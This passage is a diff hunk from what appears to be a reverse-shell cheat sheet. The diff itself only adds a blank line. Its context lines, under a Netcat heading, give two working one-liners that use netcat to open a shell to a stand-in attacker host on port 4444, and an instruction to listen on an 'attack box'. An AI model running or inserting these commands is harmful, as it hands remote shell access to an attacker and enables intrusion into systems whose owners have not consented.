@@ -6,6 +6,7 @@ For all these below mentioned you should be listening on your attack box
 ### 1. Netcat
 
 For old versions of netcat -  
+
 	nc attackerip 4444  -e /bin/sh
 	/bin/sh | nc attackerip 4444  
 
